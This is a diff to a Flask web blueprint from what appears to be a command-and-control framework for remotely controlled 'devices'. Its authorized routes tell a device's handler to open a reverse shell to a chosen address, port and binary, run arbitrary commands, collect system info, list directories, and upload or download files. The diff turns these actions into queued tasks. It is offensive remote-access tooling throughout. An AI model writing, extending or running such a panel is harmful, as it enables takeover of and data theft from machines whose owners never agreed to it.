@@ -1,5 +1,5 @@
 from Commander import Commander
-from Database import DeviceModel, db_session
+from Database import DeviceModel, Session
 from flask import Blueprint, jsonify, render_template, request, send_file
 from Utils.web import authorized, generate_response
 
@@ -11,7 +11,7 @@ def devices_bp(commander: Commander):
     @authorized
     def get_devices():
         use_json = request.args.get("json", "").lower() == "true"
-        device_query = db_session.query(DeviceModel)
+        device_query = Session.query(DeviceModel)
         devices: list[DeviceModel] = device_query.all()
         if use_json:
             return jsonify([device.to_json(commander) for device in devices])
@@ -25,18 +25,19 @@ def devices_bp(commander: Commander):
         device_id = request.args.get("id")
         address = request.form.get("address")
         port = request.form.get("port")
+        binary = request.form.get("binary")
 
         if not device_id.isdigit():
             return generate_response("error", "Invalid ID.", "devices", 400)
         device_id = int(device_id)
 
-        try:
-            commander.get_active_handler(
-                device_id).reverse_shell(address, port)
+        try: 
+            task = commander.get_active_handler(
+                device_id).reverse_shell(address, port, binary)
         except Exception as e:
-            return generate_response("error", str(e), "listeners", 500)
+            return generate_response("error", str(e), "devices", 500)
         else:
-            return generate_response("success", "Reverse Shell opened.", "listeners")
+            return generate_response("success", "Task created.", "devices")
 
     @devices_bp.route("/rce", methods=["POST"])
     @authorized
@@ -44,16 +45,16 @@ def devices_bp(commander: Commander):
         device_id = request.args.get("id")
         cmd = request.form.get("cmd")
 
-        if not device_id .isdigit():
+        if not device_id.isdigit():
             return generate_response("error", "Invalid ID.", "devices", 400)
         device_id = int(device_id)
 
         try:
             output = commander.get_active_handler(device_id).rce(cmd)
         except Exception as e:
-            return generate_response("error", str(e), "listeners", 500)
+            return generate_response("error", str(e), "devices", 500)
         else:
-            return generate_response("success", output, "listeners")
+            return generate_response("success", "Task created.", "devices")
 
     @devices_bp.route("/info", methods=["GET"])
     @authorized
@@ -68,9 +69,9 @@ def devices_bp(commander: Commander):
         try:
             output = commander.get_active_handler(device_id).infos()
         except Exception as e:
-            return generate_response("error", str(e), "listeners", 500)
+            return generate_response("error", str(e), "devices", 500)
         else:
-            return jsonify({"status": "success", "message": output})
+            return generate_response("success", "Task created.", "devices")
 
     @devices_bp.route("/dir", methods=["GET"])
     @authorized
@@ -87,7 +88,7 @@ def devices_bp(commander: Commander):
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
         else:
-            return jsonify({"status": "success", "message": output})
+            return generate_response("success", "Task created.", "devices")
 
     @devices_bp.route("/upload", methods=["POST"])
     @authorized
@@ -108,7 +109,7 @@ def devices_bp(commander: Commander):
         except Exception as e:
             return generate_response("error", str(e), "devices", 500)
         else:
-            return generate_response("success", output, "devices")
+            return generate_response("success", "Task created.", "devices")
 
     @devices_bp.route("/download", methods=["GET"])
     @authorized
@@ -126,5 +127,5 @@ def devices_bp(commander: Commander):
         except Exception as e:
             return generate_response("error", str(e), "/devices", 500)
         else:
-            return send_file(file)
+            return generate_response("success", "Task created.", "devices")
     return devices_bp
